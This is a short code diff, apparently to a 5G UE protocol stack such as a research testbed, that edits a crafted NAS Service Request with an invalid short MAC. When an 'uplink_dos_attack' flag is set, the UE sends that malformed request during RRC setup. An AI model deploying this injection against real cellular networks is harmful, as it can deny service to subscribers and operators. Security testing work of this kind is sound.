@@ -100,7 +100,7 @@ static const char  nr_nas_attach_req_imsi[] = {
 
 /* NAS Service request with IMSI for uplink DoS attack */
 static const char _nas_service_request[] = {
-  0x07, 0x4d,
+  0x7e, 0x00, 0x4c,
   0x4, // KSI and sequence number
   0xff, 0xff // Short MAC (Invalid)
 };
@@ -1327,11 +1327,12 @@ static void rrc_ue_generate_RRCSetupComplete(
     }
     nas_msg = (char*)initialNasMsg.data;
     nas_msg_length = initialNasMsg.length;
-  }
-  else if (uplink_dos_attack /* != 0 */) {
-    LOG_E(RRC, "[Uplink DoS] encoding service request with invalid MAC\n");
-    nas_msg = _nas_service_request;
-    nas_msg_length = sizeof(_nas_service_request);
+
+    if (uplink_dos_attack /* != 0 */) {
+      LOG_E(RRC, "[Uplink DoS] encoding service request with invalid MAC\n");
+      nas_msg = _nas_service_request;
+      nas_msg_length = sizeof(_nas_service_request);
+    }
   }
   else {
     nas_msg         = nr_nas_attach_req_imsi;
